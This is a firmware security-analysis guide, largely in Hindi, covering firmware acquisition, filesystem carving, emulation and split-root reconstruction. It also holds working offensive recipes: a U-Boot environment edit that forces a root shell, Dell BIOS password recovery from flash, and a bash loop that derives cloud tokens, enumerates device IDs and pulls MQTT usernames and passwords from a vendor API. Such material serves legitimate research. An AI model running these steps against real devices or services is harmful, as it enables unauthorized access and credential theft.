# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

exposed hardware interfaces से acquisition के लिए, [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) और [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) देखें। console access से पहले boot-time पर बार-बार UART capture करने के लिए, [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) देखें।

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware एक आवश्यक software है, जो hardware components और users द्वारा इस्तेमाल किए जाने वाले software के बीच communication को manage और facilitate करके devices को सही तरीके से काम करने में सक्षम बनाता है। इसे permanent memory में store किया जाता है, ताकि device को चालू होते ही महत्वपूर्ण निर्देश उपलब्ध हों और operating system शुरू हो सके। Security vulnerabilities की पहचान करने के लिए firmware की जाँच करना और उसमें संभावित बदलाव करना एक अहम कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी जुटाना**

**जानकारी जुटाना** किसी device की बनावट और उसमें इस्तेमाल की गई technologies को समझने का एक अहम शुरुआती कदम है। इस प्रक्रिया में इन विषयों पर data इकट्ठा किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की जानकारी
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architecture और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बेहद उपयोगी हैं। उपलब्ध open-source software components का manual और automated review के ज़रिए analysis करना भी उतना ही उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis उपलब्ध कराते हैं, जिनका उपयोग संभावित समस्याएँ खोजने के लिए किया जा सकता है।

## **Firmware हासिल करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता अलग-अलग होती है:

- Source (developers, manufacturers) से **सीधे**
- दिए गए निर्देशों के अनुसार **बनाकर**
- Official support sites से **download करके**
- Hosted firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** को सीधे access करके
- Man-in-the-middle techniques से **updates** को intercept करके
- **UART**, **JTAG** या **PICit** जैसे connections के ज़रिए device से **extract करके**
- Device communication में update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके और उनका उपयोग करके
- Bootloader या network से **dump करके**
- जब बाकी सभी तरीके विफल हों, तो उचित hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### केवल UART logs: flash में U-Boot env के ज़रिए root shell को force करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ़ logs मिलते हैं), तो आप फिर भी offline **U-Boot environment blob को edit करके** init shell को force कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` को `init=/bin/sh` शामिल करने के लिए संपादित करें, और blob के लिए **U-Boot env CRC32 को फिर से गणना करें**।
3. केवल env partition को रीफ़्लैश करें और रीबूट करें; UART पर shell दिखाई देनी चाहिए।

यह उन embedded devices पर उपयोगी है जहाँ bootloader shell disabled है, लेकिन external flash access के ज़रिए env partition में लिखा जा सकता है।

## firmware का विश्लेषण

अब जब आपके पास **firmware है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि इसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools इस्तेमाल कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर आपको उन tools से ज़्यादा कुछ न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो संभवतः वह encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः वह encrypted है (या किसी तरह compressed है)।

इसके अलावा, firmware के अंदर **embedded files** निकालने के लिए आप ये tools इस्तेमाल कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) इस्तेमाल कर सकते हैं।

### Differential flash analysis और recoverable XOR secret stores

जब किसी firmware setting का storage format documented न हो, तो पहले एक जैसे कई flash reads लें, **सिर्फ़ एक** setting बदलें, फिर पूरी chip को दोबारा dump करें और offsets की तुलना करें। इस प्रयोग को नियंत्रित values के साथ दोहराने से setting में हुए बदलावों को counters और write metadata से अलग पहचाना जा सकता है; अगर बदलाव उसी जगह होने के बजाय नए offsets पर दिखें, तो store append-only या log-structured हो सकता है। Deleted/tombstoned entries को बनाए रखें, क्योंकि उनका payload bytes अब भी recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे टूल का इस्तेमाल करके firmware modules निकालें और Ghidra में writer/validator को reverse करें। ciphertext patterns से ही scheme का अनुमान लगाने के बजाय, code में field boundaries, padding, key indexing और key derivation की पुष्टि करें।<sup>[[12]](#references)</sup>

#### एन्क्रिप्टेड zero padding से keys पुनर्प्राप्त करें

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताए अनुसार, ज्ञात plaintext से उसी offset पर keystream bytes का पता चलता है। जब किसी fixed-size field की zero padding, repeating XOR key के हर index तक फैली हो, तो वह विशेष रूप से उजागर हो जाती है: एन्क्रिप्टेड padding सीधे उन key bytes को दिखाती है, क्योंकि `0x00 XOR key_byte = key_byte`। यदि key का हर index शामिल हो, तो ciphertext के tail से key पुनर्निर्मित करें और उसमें भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का vulnerable DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में repeating 20-byte key का इस्तेमाल होता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले `L..31` स्थितियाँ शून्य थीं। जब `L <= 12` हो, तो ये स्थितियाँ हर key index को कवर करती हैं, इसलिए brute force के बिना पूरी key और पासवर्ड पुनर्प्राप्त हो जाते हैं:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### ऐतिहासिक रिकॉर्ड से keys निकालें

हर रिकॉर्ड का अलग-अलग विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से derive होती है: device seed और GUID स्थिर होते हैं, और password पर निर्भर एकमात्र input उसका clear first byte होता है। इससे हर device के लिए अधिकतम 256 keys बनती हैं, और एक ही byte से शुरू होने वाले रिकॉर्ड एक ही key साझा करते हैं। उस byte के आधार पर active और deleted रिकॉर्ड को समूहित करें; कोई छोटा ऐतिहासिक रिकॉर्ड padding के ज़रिए पूरी key leak कर सकता है और किसी मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है, जिसकी अपनी padding पर्याप्त न हो। इसलिए, पुराने ciphertext को मिटाने के बजाय tombstone करने पर password rotation से exposure बढ़ सकता है।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool DVAR का पता लगाता है, candidate रिकॉर्ड को validate करता है, passwords recover करता है और raw stored/key bytes दिखा सकता है। इसे checkout से build करें और verified flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Custom parser के लिए, record संरचना, printable-character की बाध्यताओं, zero-padding जाँचों, key entropy और key के wrap होने पर consistency का उपयोग करके false positives अस्वीकार करें। यदि बार-बार लिए गए dumps में हर write पर कुछ ही bit flips दिखें, तो देखे गए masks की सूची बनाएँ और इन बाध्यताओं के आधार पर संभावित corrections को rank करें; लेकिन heuristic output को सटीक recovery बताने के बजाय अस्पष्ट characters की रिपोर्ट करें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash संग्रहित होना चाहिए, और log-structured stores में superseded secret material को सुरक्षित रूप से हटाया जाना चाहिए।<sup>[[12]](#references)</sup>

### Filesystem प्राप्त करना

पहले बताए गए tools, जैसे `binwalk -ev <bin>`, से आप **filesystem extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **filesystem के प्रकार के नाम वाले folder** में extract करता है, जो आमतौर पर इनमें से कोई एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Filesystem को मैन्युअल रूप से Extract करना

कभी-कभी, binwalk के signatures में filesystem के magic byte मौजूद नहीं होंगे। ऐसे मामलों में, binwalk का उपयोग करके **filesystem का offset ढूँढ़ें और binary से compressed filesystem को carve करें**, फिर नीचे दिए गए steps के अनुसार उसके प्रकार के आधार पर filesystem को **मैन्युअल रूप से extract करें**।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्न कमांड भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" डायरेक्टरी में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फ़ाइलसिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फ़ाइलसिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### विभाजित embedded root filesystems का पुनर्निर्माण

यदि raw eMMC/SSD dump में वैध filesystem header हो, लेकिन उसके metadata offsets nominal partition से आगे तक फैले हों, तो उसे तुरंत corrupt न मानें। Embedded boot code, Device Mapper की मदद से कई physical ranges से वास्तविक root device बना सकता है, इसलिए एक GPT partition को carve करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरे media image की ट्रायेज करें

पहले पुष्टि करें कि acquisition पूरा हो चुका है, आकार स्थिर है और image को कोई writer अभी भी खुला रखे हुए नहीं है। यदि filename में start/end address दिए गए हों, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल आवश्यक range को attach करें; workstation पर किसी untrusted physical volume के विरुद्ध `vgchange -ay` **न चलाएँ**, क्योंकि इससे volume-group collisions और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

जब original init logic या LVM stack को पूरी image देखनी हो, तो disposable VM को प्राथमिकता दें। Standard boot partition के ऐतिहासिक boot logs विशेष रूप से उपयोगी होते हैं: bootloader ने proprietary-container के offsets, component lengths, slot selection, alignment rules और signature verification को log किया हो सकता है। इन मानों का उपयोग करके embedded command line/kernel/initramfs को carve करें, फिर हर output को `file`, magic bytes और `binwalk` से स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से गलती से initrd, ACPI object या signature kernel में जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map पुनः प्राप्त करें

Kernel का initramfs extract करें और उसके `/init` तथा किसी भी storage library को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references का अनुसरण करें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 में शुरुआत के लिए उपयोगी commands हैं `r2 -A init`, `afl`, `pdf @ main`, और `pdf @ fcn.xxxxx`।<sup>[[9]](#references)</sup>

Linear target किसी virtual device की लगातार ranges को एक या अधिक backing devices की ranges पर map करता है। पुनः प्राप्त की गई दो-segment table का सामान्य रूप यह होता है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

मशीन-कोड के अंकगणित को बिल्कुल उसी तरह दोहराएँ, जिसमें पूर्णांक की चौड़ाई, shifts और इकाई रूपांतरण शामिल हैं। उदाहरण के लिए, निम्नलिखित expression पहले byte size को 4-KiB boundary तक floor करता है और उसके बाद ही उसे 512-byte sectors में बदलता है; इसे `p4_bytes // 512` से बदलने पर, जब भी partition page-aligned न हो, चुना गया tail `p4_bytes % 4096` जितना खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

टेबल के क्रम में सीमित आकार के chunks कॉपी करके flat analysis image का पुनर्निर्माण करें, बजाय इसके कि पूरे media dump को memory में लोड करें। इससे host-side mapper devices बनाने से भी बचा जा सकता है। GPT से प्राप्त offsets, उलटे sector counts और परिणामी output length को अलग-अलग assertions के रूप में रखें।<sup>[[9]](#references)</sup>

#### डेटा corruption और reconstruction की स्थिर त्रुटि में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic जाँचें और superblock offset 40 पर little-endian 64-bit `bytes_used` field को decode करें। यदि कई असंबंधित structures में extraction विफल हो, तो अपेक्षित positions के आसपास की एक विस्तृत window खोजें और मज़बूत structural candidates की माँग करें: decompressible metadata block, लगातार कई valid directory entries, plausible inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब वही signed delta स्वतंत्र structures को valid बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes का गायब होना नहीं, बल्कि segment-start में व्यवस्थित त्रुटि है। orphan recovery या filesystem metadata को patch करने से पहले, उलटी arithmetic पर लौटें और छोड़े गए remainders, signedness, overflow या sector/page rounding की जाँच करें।<sup>[[9]](#references)</sup>

अंत में, protection boundaries को अलग रखें: TPM-sealed LUKS volumes डेटा की गोपनीयता की रक्षा करते हैं, जबकि signed dm-verity mapping root-filesystem की integrity की रक्षा करती है। Software TPM, original physical TPM से sealed key को recover नहीं कर सकता; और verity verification छोड़ने वाले research-only init के ज़रिए modified SquashFS को boot करने से उसका signature forge नहीं होता और न ही dm-verity टूटता है।<sup>[[9]](#references)</sup>

## फर्मवेयर का विश्लेषण

फर्मवेयर प्राप्त हो जाने के बाद, उसकी संरचना और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना ज़रूरी है। इस प्रक्रिया में फर्मवेयर image का विश्लेषण करने और उससे उपयोगी data निकालने के लिए विभिन्न tools का उपयोग किया जाता है।

### प्रारंभिक विश्लेषण के टूल

binary file (जिसे `<bin>` कहा गया है) की शुरुआती जाँच के लिए commands का एक सेट दिया गया है। इन commands से file type की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem की जानकारी समझने में मदद मिलती है:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइलों की जाँच के लिए **binvis.io** जैसे tools और resources की सिफ़ारिश की जाती है।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर फ़ाइल सिस्टम निकाला जा सकता है। यह अक्सर फ़ाइल सिस्टम के प्रकार (जैसे, squashfs, ubifs) के नाम वाली directory में निकाला जाता है। हालाँकि, जब **binwalk** missing magic bytes के कारण फ़ाइल सिस्टम के प्रकार को पहचानने में विफल रहता है, तो manual extraction ज़रूरी होता है। इसमें फ़ाइल सिस्टम का offset ढूँढ़ने के लिए `binwalk` का उपयोग करना और फिर फ़ाइल सिस्टम को carve out करने के लिए `dd` command चलाना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, फ़ाइल सिस्टम के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, उसकी सामग्री को मैन्युअल रूप से निकालने के लिए अलग-अलग commands का उपयोग किया जाता है।

### फ़ाइल सिस्टम का विश्लेषण

फ़ाइल सिस्टम निकालने के बाद, सुरक्षा खामियों की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की सुविधाओं, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जाँचने के लिए **मुख्य स्थानों** और **आइटम** में शामिल हैं:

- उपयोगकर्ता credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के विश्लेषण के लिए embedded binaries
- आम IoT device web servers और binaries

फ़ाइल सिस्टम में संवेदनशील जानकारी और vulnerabilities खोजने में कई tools मदद करते हैं:

- संवेदनशील जानकारी खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर सुरक्षा जाँच

फ़ाइल सिस्टम में मिले source code और compiled binaries, दोनों की vulnerabilities के लिए जाँच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools ऐसे असुरक्षित binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials प्राप्त करना

कई IoT hubs हर device का configuration एक cloud endpoint से प्राप्त करते हैं, जो इस तरह दिखता है:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का उपयोग करके बनाया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ), और इसे uppercase hex के रूप में दर्शाया जाता है

इस design से deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को फिर से बना सकता है और cloud config प्राप्त कर सकता है। इससे अक्सर plaintext MQTT credentials और topic prefixes सामने आ जाते हैं।

व्यावहारिक कार्यप्रवाह:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs कैप्चर करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- ऐसी पंक्तियाँ खोजें जो cloud config URL pattern और broker address प्रिंट करती हों, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm प्राप्त करें

- Binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 usage खोजें।
- Algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token derive करें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config और MQTT credentials प्राप्त करें

- URL बनाएं और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और कमज़ोर topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- प्राप्त credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील events खोजें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएँ (बड़े पैमाने पर, प्राधिकरण के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक क्रमिक suffix शामिल होता है।
- आप candidate IDs को iterate करके, tokens derive कर सकते हैं और programmatically configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** करने में सक्षम बनाती है। इस तरीके में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या विशिष्ट binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से बने virtual machine में transfer करने से आगे की testing आसान हो सकती है।

### Individual Binaries को Emulate करना

एकल programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` सही विकल्प होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools full firmware emulation की सुविधा देते हैं। ये प्रक्रिया को automate करते हैं और dynamic analysis में मदद करते हैं।

### Emulation के लिए split और verified root filesystems का पुनर्निर्माण

यदि SquashFS superblock पढ़ा जा सकता है, लेकिन inode, directory या fragment-table offsets असंभव हों, तो तुरंत `unsquashfs` को patch न करें। Early boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को पुनः बनाएँ: embedded systems में nominal root partition दिख सकता है, लेकिन वास्तविक filesystem `dm-linear` mapping से बनाया जा सकता है, जो किसी अन्य partition से लिए गए sectors को जोड़ता है। Superblock-only checks सफल हो सकते हैं, जबकि बाद के सभी metadata blocks खिसके हुए हों।<sup>[[11]](#references)</sup>

Firmware की arithmetic को बिल्कुल वैसा ही रखें। खास तौर पर पहचानें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank-dependent tail regions का हिसाब रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले 4 KiB boundary तक truncate करता है और फिर परिणाम को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर appended extent कुछ kilobytes तक खिसक सकता है और आगे की सभी SquashFS tables corrupt हो सकती हैं।<sup>[[11]](#references)</sup>

एक उपयोगी validation workflow यह है:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length प्राप्त करें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. यदि extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटा window खोजें और अकेले संभावित superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. पुनर्निर्मित image पर unmodified `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` की तुलना में अधिक मजबूत प्रमाण है।

#### Analyst-controlled dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तब vendor के verification PID 1 को एक छोटे statically linked init से बदलकर modified root को boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करें, `setsid()` call करें, `/dev/console` को file descriptors 0–2 से connect करें, `/proc` और `/sys` mount करें, दिए गए block device का इंतज़ार करें, edited root को read-only mount करें, old-root pseudo-filesystems को detach करें, नए mount को `/` पर ले जाएँ, `chroot` करें और firmware के मूल `/sbin/init` को `execve()` करें। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root के mount points गलती से detach होने से बचते हैं।<sup>[[11]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। एक qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरा read-only virtio disk edited SquashFS उपलब्ध कराता है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

जब slow boots, destructive startup scripts या अविश्वसनीय console logging के कारण विफलता का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। कभी भी ऐसा overlay attach न करें जिसका उपयोग कोई running VM कर रही हो; उसे `qemu-nbd` से expose करें, LVM discovery को इच्छित NBD partition तक सीमित रखें, और disconnect करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

